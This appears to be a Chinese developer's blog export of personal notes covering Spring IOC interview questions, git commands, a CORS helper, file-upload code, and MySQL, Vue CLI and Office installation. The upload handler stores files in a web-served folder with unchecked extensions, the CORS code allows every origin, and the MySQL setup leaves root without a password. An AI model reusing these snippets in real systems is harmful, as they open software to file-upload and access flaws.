title="2、IOC底层（面试）"></a>2、IOC底层（面试）</h4><p>xml解析、工厂模式、反射</p><p>ioc过程：第一步 xml配置文件，配置创建的对象</p><p>​                 第二步 有service类和dao类，创建工厂类，通过xml解析并通过反射原理创建对象，实现代码的复用，进一步降低耦合度</p><h4 id="3、IOC-思想基于-IOC-容器完成，IOC-容器底层就是对象工厂，Spring提供的I0C容器实现的两种方式（两个接口）（面试）"><a href="#3、IOC-思想基于-IOC-容器完成，IOC-容器底层就是对象工厂，Spring提供的I0C容器实现的两种方式（两个接口）（面试）" class="headerlink" title="3、IOC 思想基于 IOC 容器完成，IOC 容器底层就是对象工厂，Spring提供的I0C容器实现的两种方式（两个接口）（面试）"></a>3、IOC 思想基于 IOC 容器完成，IOC 容器底层就是对象工厂，Spring提供的I0C容器实现的两种方式（两个接口）（面试）</h4><p>（1）<strong>BeanFactory</strong>接口：IOC容器基本实现是Spring内部接口的使用接口，不提供给开发人员进行使用（加载配置文件时候不会创建对象，在获取对象时才会创建对象。）<br>（2）<strong>ApplicationContext</strong>接口：BeanFactory接口的子接口，提供更多更强大的功能，提供给开发人员使用（加载配置文件时候就会把在配置文件对象进行创建）推荐使用！</p><h4 id="4-ApplicationContext通常的实现是什么-（面试）"><a href="#4-ApplicationContext通常的实现是什么-（面试）" class="headerlink" title="4.ApplicationContext通常的实现是什么?（面试）"></a>4.ApplicationContext通常的实现是什么?（面试）</h4><p><strong>FileSystemXmlApplicationContext</strong> ：此容器从一个XML文件中加载beans的定义，XML Bean配置文件的全路径名必须提供给它的构造函数。<br><strong>ClassPathXmlApplicationContext</strong>：此容器也从一个XML文件中加载beans的定义，这里，你需要正确设置classpath因为这个容器将在classpath里找bean配置。</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    ApplicationContext context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"bean1.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//  ApplicationContext context = new FileSystemXmlApplicationContext("\..\");路径</span>    Student student <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"student"</span><span class="token punctuation">,</span> Student<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token punctuation">;</span>    student<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="4、IOC的优点是什么？（面试）"><a href="#4、IOC的优点是什么？（面试）" class="headerlink" title="4、IOC的优点是什么？（面试）"></a>4、IOC的优点是什么？（面试）</h4><p>IOC 或 依赖注入把应用的代码量降到最低。它使应用容易测试，单元测试不再需要单例和JNDI查找机制。最小的代价和最小的侵入性使松散耦合得以实现。IOC容器支持加载服务时的饿汉式初始化和懒加载。</p><h4 id="5、Bean-工厂和-Application-contexts-有什么区别？（面试）"><a href="#5、Bean-工厂和-Application-contexts-有什么区别？（面试）" class="headerlink" title="5、Bean 工厂和 Application contexts 有什么区别？（面试）"></a>5、Bean 工厂和 Application contexts 有什么区别？（面试）</h4><p>Application contexts提供一种方法处理文本消息，一个通常的做法是加载文件资源（比如镜像），它们可以向注册为监听器的bean发布事件。另外，在容器或容器内的对象上执行的那些不得不由bean工厂以程序化方式处理的操作，可以在Application contexts中以声明的方式处理。Application contexts实现了MessageSource接口，该接口的实现以可插拔的方式提供获取本地化消息的方法。</p><h3 id="三、IOC-和DI"><a href="#三、IOC-和DI" class="headerlink" title="三、IOC 和DI"></a>三、IOC 和DI</h3><h4 id="1-Bean-管理操作有两种方式"><a href="#1-Bean-管理操作有两种方式" class="headerlink" title="1.Bean 管理操作有两种方式"></a>1.Bean 管理操作有两种方式</h4><p>（1）基于 xml 配置文件方式实现 （2）基于注解方式实现</p><h4 id="2-什么是Spring的依赖注入（DI：Dependency-Injection-）？-面试"><a href="#2-什么是Spring的依赖注入（DI：Dependency-Injection-）？-面试" class="headerlink" title="2.什么是Spring的依赖注入（DI：Dependency Injection ）？(面试)"></a>2.什么是Spring的依赖注入（DI：Dependency Injection ）？(面试)</h4><p>依赖注入，是IOC的一个方面，是个通常的概念，它有多种解释。这概念是说你不用创建对象，而只需要描述它如何被创建。你不在代码里直接组装你的组件和服务，但是要在配置文件里描述哪些组件需要哪些服务，之后一个容器（IOC容器）负责把他们组装起来。</p><h4 id="3、有哪些不同类型的IOC（依赖注入）方式？（面试）"><a href="#3、有哪些不同类型的IOC（依赖注入）方式？（面试）" class="headerlink" title="3、有哪些不同类型的IOC（依赖注入）方式？（面试）"></a>3、有哪些不同类型的IOC（依赖注入）方式？（面试）</h4><p><strong>构造器依赖注入</strong>：构造器依赖注入通过容器触发一个类的构造器来实现的，该类有一系列参数，每个参数代表一个对其他类的依赖。<br><strong>Setter方法注入</strong>：Setter方法注入是容器通过调用无参构造器或无参static工厂方法实例化bean之后，调用该bean的setter方法，即实现了基于setter的依赖注入。</p><h4 id="4-哪种依赖注入方式你建议使用，构造器注入，还是-Setter方法注入？（面试）"><a href="#4-哪种依赖注入方式你建议使用，构造器注入，还是-Setter方法注入？（面试）" class="headerlink" title="4.哪种依赖注入方式你建议使用，构造器注入，还是 Setter方法注入？（面试）"></a>4.哪种依赖注入方式你建议使用，构造器注入，还是 Setter方法注入？（面试）</h4><p>你两种依赖方式都可以使用，构造器注入和Setter方法注入。最好的解决方案是用构造器参数实现强制依赖，setter方法实现可选依赖。</p><h3 id="四、spring-aop"><a href="#四、spring-aop" class="headerlink" title="四、spring aop"></a>四、spring aop</h3><h3 id="五、spring事物管理"><a href="#五、spring事物管理" class="headerlink" title="五、spring事物管理"></a>五、spring事物管理</h3><p>注解</p><pre><code>@RestController相当于@Controller+@ResponseBody</code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git常用命令</title>
      <link href="/2020/07/30/git-chang-yong-ming-ling/"/>
      <url>/2020/07/30/git-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h4 id="一、仓库"><a href="#一、仓库" class="headerlink" title="一、仓库"></a>一、仓库</h4><pre><code># 在当前目录新建一个Git代码库$ git init# 新建一个目录，将其初始化为Git代码库$ git init [project-name]# 下载一个项目和它的整个代码历史$ git clone [url]</code></pre><h4 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h4><pre><code># 显示当前的Git配置$ git config --list# 编辑Git配置文件$ git config -e [--global]# 设置提交代码时的用户信息$ git config [--global] user.name &quot;[name]&quot;$ git config [--global] user.email &quot;[email address]&quot;</code></pre><h4 id="三、增加-删除文件"><a href="#三、增加-删除文件" class="headerlink" title="三、增加/删除文件"></a>三、增加/删除文件</h4><pre><code># 添加指定文件到暂存区$ git add [file1] [file2] ...# 添加指定目录到暂存区，包括子目录$ git add [dir]# 添加当前目录的所有文件到暂存区$ git add .# 添加每个变化前，都会要求确认# 对于同一个文件的多处变化，可以实现分次提交$ git add -p# 删除工作区文件，并且将这次删除放入暂存区$ git rm [file1] [file2] ...# 停止追踪指定文件，但该文件会保留在工作区，--cached删除远程仓库$ git rm --cached [file] (git rm --cached -r .idea)# 改名文件，并且将这个改名放入暂存区$ git mv [file-original] [file-renamed]</code></pre><h4 id="四、代码提交"><a href="#四、代码提交" class="headerlink" title="四、代码提交"></a>四、代码提交</h4><pre><code># 提交暂存区到仓库区$ git commit -m [message]# 提交暂存区的指定文件到仓库区$ git commit [file1] [file2] ... -m [message]# 提交工作区自上次commit之后的变化，直接到仓库区$ git commit -a# 提交时显示所有diff信息$ git commit -v# 使用一次新的commit，替代上一次提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message]# 重做上一次commit，并包括指定文件的新变化$ git commit --amend [file1] [file2] ...</code></pre><h4 id="五、分支"><a href="#五、分支" class="headerlink" title="五、分支"></a>五、分支</h4><pre><code># 列出所有本地分支$ git branch# 列出所有远程分支$ git branch -r# 列出所有本地分支和远程分支$ git branch -a# 新建一个分支，但依然停留在当前分支$ git branch [branch-name]# 新建一个分支，并切换到该分支$ git checkout -b [branch]# 获取某个版本的代码$ git checkout [commit]# 新建一个分支，指向指定commit$ git branch [branch] [commit]# 新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch]# 切换到指定分支，并更新工作区$ git checkout [branch-name]# 切换到上一个分支$ git checkout -# 建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch]# 合并指定分支到当前分支$ git merge [branch]# 选择一个commit，合并进当前分支$ git cherry-pick [commit]# 删除分支$ git branch -d [branch-name]# 删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote/branch]</code></pre><h4 id="六、标签"><a href="#六、标签" class="headerlink" title="六、标签"></a>六、标签</h4><pre><code># 列出所有tag$ git tag# 新建一个tag在当前commit$ git tag [tag]# 新建一个tag在指定commit$ git tag [tag] [commit]# 删除本地tag$ git tag -d [tag]# 删除远程tag$ git push origin :refs/tags/[tagName]# 查看tag信息$ git show [tag]# 提交指定tag$ git push [remote] [tag]# 提交所有tag$ git push [remote] --tags# 新建一个分支，指向某个tag$ git checkout -b [branch] [tag]</code></pre><h4 id="七、查看信息"><a href="#七、查看信息" class="headerlink" title="七、查看信息"></a>七、查看信息</h4><pre><code># 显示有变更的文件$ git status# 显示当前分支的版本历史$ git log# 显示commit历史，以及每次commit发生变更的文件$ git log --stat# 搜索提交历史，根据关键词$ git log -S [keyword]# 显示某个commit之后的所有变动，每个commit占据一行$ git log [tag] HEAD --pretty=format:%s# 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件$ git log [tag] HEAD --grep feature# 显示某个文件的版本历史，包括文件改名$ git log --follow [file]$ git whatchanged [file]# 显示指定文件相关的每一次diff$ git log -p [file]# 显示过去5次提交$ git log -5 --pretty --oneline# 显示所有提交过的用户，按提交次数排序$ git shortlog -sn# 显示指定文件是什么人在什么时间修改过$ git blame [file]# 显示暂存区和工作区的差异$ git diff# 显示暂存区和上一个commit的差异$ git diff --cached [file]# 显示工作区与当前分支最新commit之间的差异$ git diff HEAD# 显示两次提交之间的差异$ git diff [first-branch]...[second-branch]# 显示今天你写了多少行代码$ git diff --shortstat &quot;@{0 day ago}&quot;# 显示某次提交的元数据和内容变化$ git show [commit]# 显示某次提交发生变化的文件$ git show --name-only [commit]# 显示某次提交时，某个文件的内容$ git show [commit]:[filename]# 显示当前分支的最近几次提交$ git reflog</code></pre><h4 id="八、远程同步"><a href="#八、远程同步" class="headerlink" title="八、远程同步"></a>八、远程同步</h4><pre><code># 下载远程仓库的所有变动$ git fetch [remote]# 显示所有远程仓库$ git remote -v# 显示某个远程仓库的信息$ git remote show [remote]# 增加一个新的远程仓库，并命名$ git remote add [shortname] [url]# 取回远程仓库的变化，并与本地分支合并$ git pull [remote] [branch]# fatal: refusing to merge unrelated histories异常解决，解决冲突$ git pull$ git pull origin master$ git pull [remote] [branch] --allow-unrelated-histories$ git push -u origin master -f# 上传本地指定分支到远程仓库$ git push [remote] [branch]# 强行推送当前分支到远程仓库，即使有冲突$ git push [remote] --force# 推送所有分支到远程仓库$ git push [remote] --all</code></pre><h4 id="九、撤销"><a href="#九、撤销" class="headerlink" title="九、撤销"></a>九、撤销</h4><pre><code># 恢复暂存区的指定文件到工作区$ git checkout [file]# 恢复某个commit的指定文件到暂存区和工作区$ git checkout [commit] [file]# 恢复暂存区的所有文件到工作区$ git checkout .# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变$ git reset [file]# 重置暂存区与工作区，与上一次commit保持一致$ git reset --hard# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变$ git reset [commit]# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致$ git reset --hard [commit]# 重置当前HEAD为指定commit，但保持暂存区和工作区不变$ git reset --keep [commit]# 新建一个commit，用来撤销指定commit# 后者的所有变化都将被前者抵消，并且应用到当前分支$ git revert [commit]# 暂时将未提交的变化移除，稍后再移入$ git stash$ git stash pop</code></pre><h4 id="十、关于-gitignore文件"><a href="#十、关于-gitignore文件" class="headerlink" title="十、关于.gitignore文件"></a>十、关于.gitignore文件</h4><pre><code># 配置.gitignore文件(新建/编辑）$ echo &#39;.idea&#39; &gt;&gt; .gitignore# 常用的.gitignore文件简短配置.project.settings/.prefs.pydevproject.idea/.idea.DS_Store.cache*.pyc*.html*.xlm*.iml</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域请求</title>
      <link href="/2020/04/15/kua-yu-qing-qiu/"/>
      <url>/2020/04/15/kua-yu-qing-qiu/</url>
      
        <content type="html"><![CDATA[<h2 id="一、后端处理"><a href="#一、后端处理" class="headerlink" title="一、后端处理"></a>一、后端处理</h2><pre><code>public HttpServletResponse getResponse(Map&lt;String,Object&gt; map) throws IOException {        if (null == response) {            String respBody = JSON.toJSONString(map);            response = ServletActionContext.getResponse();            response.setContentType(SystemContext.ACTION_CONTENT_TYPE);            response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);            response.setHeader(&quot;Cache-Control&quot;, &quot;no-cache&quot;);            response.addHeader(&quot;Access-Control-Allow-Meaders&quot;,&quot;POST&quot;);//请求格式            response.addHeader(&quot;Access-Control-Allow-Headers&quot;,&quot;x-requested-with,content-type&quot;);//响应头            //PrintWriter out = response.getWriter();//输出流            //out.print(respBody);            //out.flush();            //out.close();        }        return response;    }</code></pre><h2 id="二、调用方法"><a href="#二、调用方法" class="headerlink" title="二、调用方法"></a>二、调用方法</h2><pre><code>data = JsonBean.success(&quot;suceess&quot;,pageResult);BaseAction base = new BaseAction();base.getResponse(data);</code></pre>]]></content>
      
      
      <categories>
          
          <category> 常用方法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 跨域请求 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片上传</title>
      <link href="/2020/04/15/tu-pian-shang-chuan/"/>
      <url>/2020/04/15/tu-pian-shang-chuan/</url>
      
        <content type="html"><![CDATA[<h2 id="一、在form中写入属性enctype-“multipart-form-data”"><a href="#一、在form中写入属性enctype-“multipart-form-data”" class="headerlink" title="一、在form中写入属性enctype = “multipart/form-data”"></a>一、在form中写入属性enctype = “multipart/form-data”</h2><h4 id="1-用以设置表单的MIME编码，默认情况，这个编码格式是application-x-www-form-urlencoded，不能用于文件上传；只有使用了multipart-form-data，才能完整的传递文件数据，完成图片的上传。"><a href="#1-用以设置表单的MIME编码，默认情况，这个编码格式是application-x-www-form-urlencoded，不能用于文件上传；只有使用了multipart-form-data，才能完整的传递文件数据，完成图片的上传。" class="headerlink" title="1.用以设置表单的MIME编码，默认情况，这个编码格式是application/x-www-form-urlencoded，不能用于文件上传；只有使用了multipart/form-data，才能完整的传递文件数据，完成图片的上传。"></a>1.用以设置表单的<a href="https://www.baidu.com/s?wd=MIME&tn=44039180_cpr&fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1dBPWKWuhRvPynsnHubnARk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EPHTknW01r0" target="_blank" rel="noopener">MIME</a>编码，默认情况，这个编码格式是application/x-www-form-urlencoded，不能用于文件上传；只有使用了multipart/form-data，才能完整的传递文件数据，完成图片的上传。</h4><pre><code>&lt;form id=&quot;showDataForm&quot; class=&quot;layui-form&quot; enctype=&quot;multipart/form-data&quot; onsubmit=&quot;return PostData()&quot;&gt;</code></pre><h2 id="二、用ajax提交"><a href="#二、用ajax提交" class="headerlink" title="二、用ajax提交"></a>二、用ajax提交</h2><pre><code>$.ajax({                type: &quot;POST&quot;,                url: &#39;&#39;,                data: formData,                timeout: 6000,                async: false,                cache: false,                contentType: false,                processData: false,                success: function (msg) {                    setTimeout(function () {                        $(&quot;#scbtn&quot;).attr(&quot;disabled&quot;, false);//将提交按钮解除为可点击                        layer.msg(&#39;提交成功&#39;, {                            time: 1000                        }, function () {                            window.location.href = &quot;xx.html&quot;;                        });                    },1000);                },                error: function (msg) {                    layer.msg(&#39;提交超时，请检查您的网络连接！&#39;);                    $(&quot;#scbtn&quot;).attr(&quot;disabled&quot;, false);                }            });            return false;</code></pre><h2 id="3、后台接收代码"><a href="#3、后台接收代码" class="headerlink" title="3、后台接收代码"></a>3、后台接收代码</h2><pre><code>private File file;//与前端name一致private String fileFileName;//接收的名字    public File getFile() {        return file;    }    public void setFile(File file) {        this.file = file;    }    public String getFileFileName() {        return fileFileName;    }    public void setFileFileName(String fileFileName) {        this.fileFileName = fileFileName;    }</code></pre><pre><code>    public static int getSecondTimestamp(Date date){//将上传的图片名字改为yy-mm-dd格式        if (null == date) {            return 0;        }        String timestamp = String.valueOf(date.getTime());        int length = timestamp.length();        if (length &gt; 3) {            return Integer.valueOf(timestamp.substring(0,length-3));        } else {            return 0;        }    }</code></pre><pre><code>    public String add() throws Exception {        Date date=new Date();        if(file != null){            String path = ServletActionContext.getServletContext().getRealPath(&quot;/upload&quot;);//服务器项目根路径            File filePath = new File(path);            if(!filePath.exists()){                filePath.mkdir();            }            String format = fileFileName.split(&quot;\\.&quot;)[1];            File diskFile = new File(path + File.separator                    + String.valueOf(getSecondTimestamp(date))+&quot;.&quot;+format);            FileUtils.copyFile(file, diskFile);            casCase.setFurImage(String.valueOf(getSecondTimestamp(date))+&quot;.&quot;+format);//图片名字        }    }</code></pre>]]></content>
      
      
      <categories>
          
          <category> 常用方法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> 上传 </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制转化</title>
      <link href="/2020/04/15/er-jin-zhi-zhuan-hua/"/>
      <url>/2020/04/15/er-jin-zhi-zhuan-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="一、网页代码"><a href="#一、网页代码" class="headerlink" title="一、网页代码"></a>一、网页代码</h2><pre><code>&lt;input type=&quot;file&quot; name=&quot;&quot; id=&quot;&quot; onchange=&quot;tobin(this)&quot; value=&quot;&quot;&gt;&lt;img src=&quot;&quot; id=&quot;you&quot; width=&quot;320px&quot;&gt;&lt;div style=&quot;position: absolute;z-index: -1;width: 0px;height: 0px;overflow: hidden;&quot;&gt;    &lt;canvas id=&quot;can&quot; width=&quot;320px&quot; height=&quot;240px&quot;&gt;&lt;/canvas&gt;&lt;/div&gt;</code></pre><h2 id="二、js代码"><a href="#二、js代码" class="headerlink" title="二、js代码"></a>二、js代码</h2><pre><code>function tobin(target) {    //获取临时缓存图片的路径，并传递给“显示图片”    var url = window.URL.createObjectURL(target.files.item(0));    //制造一张图片，传入画布，让它在画布中画出来。    var img1 = new Image();    img1.src = url;    //初始化捕捉元素    var can = document.getElementById(&#39;can&#39;);    //var you = document.getElementById(&#39;you&#39;);    var context = can.getContext(&quot;2d&quot;);    //当图片制造完成后，执行函数    img1.onload = function() {        //因为canvas输出的二进制图片会根据当前canvas的大小而变形，所以要将图片原始尺寸取出，然后传递给canvas,这样就能保证输出的图片原始比例不变        var nw = img1.naturalWidth;        var nh = img1.naturalHeight;        can.setAttribute(&#39;width&#39;, nw + &#39;px&#39;)        can.setAttribute(&#39;height&#39;, nh + &#39;px&#39;)        //图片原始比例        console.log(nw, nh);        //绘制进canvas        context.drawImage(img1, 0, 0, nw, nh);        //二进制流转化函数        var bin = can.toDataURL(&quot;image/jpeg&quot;); //bin值已经存放了二进制流        //二进制流传入“显示图片”        you.src = bin;    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 常用方法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> base6 </tag>
            
            <tag> 图片二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql安装</title>
      <link href="/2020/03/30/mysql-an-zhuang/"/>
      <url>/2020/03/30/mysql-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h2 id="一、创建my-ini文件"><a href="#一、创建my-ini文件" class="headerlink" title="一、创建my.ini文件"></a>一、创建my.ini文件</h2><h4 id="1-在解压的根目录创建my-ini文件，并放入下面代码"><a href="#1-在解压的根目录创建my-ini文件，并放入下面代码" class="headerlink" title="1.在解压的根目录创建my.ini文件，并放入下面代码"></a>1.在解压的根目录创建my.ini文件，并放入下面代码</h4><pre><code># 设置mysql客户端默认字符集default-character-set=utf8[mysqld]# 设置3306端口port=3306# 设置mysql的安装目录basedir=D:\mysql-8.0.13-winx64# 设置mysql数据库的数据的存放目录datadir=D:\mysql-8.0.13-winx64\data# 允许最大连接数max_connections=200# 服务端使用的字符集默认为8比特编码的latin1字符集character-set-server=utf8# 创建新表时将使用的默认存储引擎default-storage-engine=INNODB# 默认使用“mysql_native_password”插件认证default_authentication_plugin=mysql_native_password</code></pre><h2 id="二、执行安装"><a href="#二、执行安装" class="headerlink" title="二、执行安装"></a>二、执行安装</h2><h4 id="1-进入解压的跟目录，管理员执行，当根目录有新增文件则表明成功"><a href="#1-进入解压的跟目录，管理员执行，当根目录有新增文件则表明成功" class="headerlink" title="1.进入解压的跟目录，管理员执行，当根目录有新增文件则表明成功"></a>1.进入解压的跟目录，管理员执行，当根目录有新增文件则表明成功</h4><pre><code>bin\mysqld --installbin\mysqld --initialize-insecure</code></pre><h4 id="2-重启cmd，一定要重启，并启动服务"><a href="#2-重启cmd，一定要重启，并启动服务" class="headerlink" title="2.重启cmd，一定要重启，并启动服务"></a>2.重启cmd，一定要重启，并启动服务</h4><pre><code>net start mysql</code></pre><h4 id="3-启动服务后，输入"><a href="#3-启动服务后，输入" class="headerlink" title="3.启动服务后，输入"></a>3.启动服务后，输入</h4><pre><code>mysql -uroot -p</code></pre><p>初次安装密码为空，直接回车即可</p><h4 id="4-常用代码"><a href="#4-常用代码" class="headerlink" title="4.常用代码"></a>4.常用代码</h4><pre><code>mysqld --initialize --console//查看原始密码一般为0或空 ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;你的密码&#39;;  //修改密码</code></pre>]]></content>
      
      
      <categories>
          
          <category> 软件安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue脚手架安装</title>
      <link href="/2020/03/25/vue-jiao-shou-jia-an-zhuang/"/>
      <url>/2020/03/25/vue-jiao-shou-jia-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="vue脚手架安装及路径修改"><a href="#vue脚手架安装及路径修改" class="headerlink" title="vue脚手架安装及路径修改"></a>vue脚手架安装及路径修改</h1><h3 id="一、安装node-js"><a href="#一、安装node-js" class="headerlink" title="一、安装node.js"></a>一、安装node.js</h3><p>例如我的安装路径为：D:\tool\nodejs；</p><p>node -v    检查当前node的版本；</p><p>npm -v    检查当前npm的版本;</p><p>有版本信息输出则为安装成功。</p><h3 id="二、修改node-global和node-cache资源路径"><a href="#二、修改node-global和node-cache资源路径" class="headerlink" title="二、修改node_global和node_cache资源路径"></a>二、修改node_global和node_cache资源路径</h3><p>修改node_global和node_cache资源路径的目的是防止默认安装在C盘,分别执行以下代码</p><pre><code>npm config set prefix &quot;D:\tool\nodejs\node_global&quot;npm config set cache &quot;D:\tool\nodejs\node_cache&quot;</code></pre><h3 id="三、安装淘宝镜像"><a href="#三、安装淘宝镜像" class="headerlink" title="三、安装淘宝镜像"></a>三、安装淘宝镜像</h3><p>默认下载路径比较慢，安装淘宝镜像可加快下载速度，运行以下代码</p><pre><code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></pre><p>安装成功后输入 npm config list 查询已安装信息，npm config get registry 检查一下镜像站是否切换为淘宝镜像命令，部分人安装后却发现镜像并未更改，这时候需要修改C:\Users\Administrator.npmrc目录的文件以永久使用淘宝镜像，在文件中添加</p><pre><code>registry=http://registry.npm.taobao.org</code></pre><h3 id="四、全局安装vue脚手架"><a href="#四、全局安装vue脚手架" class="headerlink" title="四、全局安装vue脚手架"></a>四、全局安装vue脚手架</h3><p>分别执行以下代码，webpack为打包</p><pre><code>npm install -g @vue/cli//全局安装脚手架npm i webpack@3.12.0 -g//全局安装webpage3.12.0稳定版</code></pre><p>有部分人安装可能会出现错误，可能是由于npm版本过低，解决方法执行</p><pre><code>npm install npm -g//检查npm安装或更新命令（可不操作）</code></pre><p>更新成功后再执行上面代码</p><h3 id="五、配置环境变量"><a href="#五、配置环境变量" class="headerlink" title="五、配置环境变量"></a>五、配置环境变量</h3><p>1.重启cmd，一定要重启，不然看不到版本信息，反正我安装后是这样；</p><p>2.当执行前面操作后vue脚手架已安装成功，下面是版本或帮助信息</p><pre><code>vue   ## 查看 vue 相关帮助信息vue --version 或 vue -V  ## 查看安装的 vue cli 版本信息</code></pre><p>3、执行后有版本信息输出则说明vue脚手架安装成功，到这里有些人会遇到不是内部或外部命令，也不是可运行的程序或批处理文件的提示，这是因为你已经把node_global和node_cache资源路径修改到了D盘，默认为C盘当然会提示不是指令啦，解决方法</p><pre><code>D:\tool\nodejs\node_global//在电脑环境变量的path下新加D:\tool\nodejs\node_global\node_modules//新建NODE_PATH加入</code></pre><p>4、在执行重新执行你会发现已经成功了！</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>office安装</title>
      <link href="/2020/03/25/office-an-zhuang/"/>
      <url>/2020/03/25/office-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="解决office自定义安装问题"><a href="#解决office自定义安装问题" class="headerlink" title="解决office自定义安装问题"></a>解决office自定义安装问题</h1><p>当我们需要安装office时，office默认会帮我们安装其所有功能，比如Access、OneNote等，但我们有时只想安装其中的Word、Excel、PowerPoint，那需要怎么做呢？</p><h3 id="一、安装DAEMON-Tools-Lite"><a href="#一、安装DAEMON-Tools-Lite" class="headerlink" title="一、安装DAEMON Tools Lite"></a>一、安装DAEMON Tools Lite</h3><p><a href="https://daemon-tools-lite.en.softonic.com/download" target="_blank" rel="noopener">daemon tools</a>是一个的虚拟光驱工具，当安装office时会用到，安装完成后将office加载进来，比如我加载后的盘符为G盘。</p><h3 id="二、安装微软官方管理器office-deployment-tool"><a href="#二、安装微软官方管理器office-deployment-tool" class="headerlink" title="二、安装微软官方管理器office deployment tool"></a>二、安装微软官方管理器office deployment tool</h3><p>下载 <a href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=49117" target="_blank" rel="noopener">Office 部署工具</a>后，双击 Officedeploymenttool 执行 (.exe) 文件以解压缩 ODT  文件。完成后，解压到的文件夹中应该有多个文件： setup.exe 和一些示例 configuration.xml  文件，而我们真正需要的是configuration-Office365-x64.xml这个文件。</p><h3 id="三、修改configuration-Office365-x64-xml文件"><a href="#三、修改configuration-Office365-x64-xml文件" class="headerlink" title="三、修改configuration-Office365-x64.xml文件"></a>三、修改configuration-Office365-x64.xml文件</h3><pre><code>&lt;Configuration&gt;  &lt;Add SourcePath=&quot;G:\&quot; OfficeClientEdition=&quot;64&quot; &gt;  //G为虚拟镜像位置,daemon tools加载office的盘符    &lt;Product ID=&quot;ProPlusRetail&quot;&gt;        &lt;Language ID=&quot;zh-CN&quot; /&gt;//选择语言        &lt;ExcludeApp ID=&quot;Access&quot; /&gt;        &lt;ExcludeApp ID=&quot;Groove&quot; /&gt;        &lt;ExcludeApp ID=&quot;InfoPath&quot; /&gt;        &lt;ExcludeApp ID=&quot;Lync&quot; /&gt;        &lt;ExcludeApp ID=&quot;OneNote&quot; /&gt;        &lt;ExcludeApp ID=&quot;Outlook&quot; /&gt;        &lt;ExcludeApp ID=&quot;Publisher&quot; /&gt;        &lt;ExcludeApp ID=&quot;SharePointDesigner&quot; /&gt;    &lt;/Product&gt;  &lt;/Add&gt;  &lt;/Configuration&gt;</code></pre><h3 id="四、运行"><a href="#四、运行" class="headerlink" title="四、运行"></a>四、运行</h3><p>启动管理员cmd（进入 office deployment tool的解压路径），输入</p><pre><code>setup.exe /configure configuration-Office365-x64.xml</code></pre><p>等待office安装完成就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> office </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
